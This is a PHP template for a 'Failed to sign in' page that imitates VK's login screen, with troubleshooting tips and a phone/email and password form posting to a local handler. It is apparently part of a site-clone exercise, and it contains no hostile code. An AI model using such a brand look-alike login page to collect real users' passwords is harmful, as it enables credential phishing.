<?php
require("../template/header.php");
?>
<head>
    <link rel="stylesheet" href="../css/error-login.css">
</head>
<main>
    <div class="container px-0">
        <div class="wrap1">
            <div class="wrap2">
                <div class="page_block" >
                    <h2>Login to VK </h2>
                    <div class="login_mes">
                        <div class="mes_error">
                            <b>Failed to sign in.</b>
                            <br>
                            Please make sure that you've entered your <b>login</b> and <b>password</b> correctly.
                            <ul class="listing">
                            <li><span>Is <b>Caps Lock</b> on?</span></li>
                            <li><span>Maybe you are using the wrong <b>input language</b>? (e.g. German vs. English)</span></li>
                            <li><span>Try typing your password in a text editor and then <b>copying and pasting</b> it into the "Password" field.</span></li>
                            <li><span>If your password was entered correctly, try entering the <b>phone number</b> linked to your account as your login instead of your email address.</span></li>
                            </ul>
                            If you've checked everything carefully but are still unable to sign in, please <b><a href="#">click here</a></b>
                        </div>
                    </div>
                    <div class="login_form">
                        <form class="bg-white m-0 p-0" action="model/process-login.php" method="POST" name="login">
                            <div class="mb-3">
                                <input type="text" class="form-control" name="txtdienthoai" id="index_email" placeholder="Phone or email">
                            </div>
                            <div class="mb-3">
                                <input type="password" class="form-control" name="txtpass" id="index_password" placeholder="Password">
                            </div>
                            <div class="formcheck"></div>
                                <label>
                                    <input type="checkbox" value="remember-me" class="checkbox"> Don't remember me
                                </label>
                                <br>
                                <div class="row mx-0">
                                    <button type="submit" class="btnsignin text-white" id="btnsignin" name="btnsignin">Sign in</button>
                                    <button type="submit" class="btnsignup text-white" id="btnsignup" name="btnsignup">Sign up </button>
                                </div>
                            </div>
                        </form>
                    </div>
                </div>
            </div>
        </div>
    </div>
</main>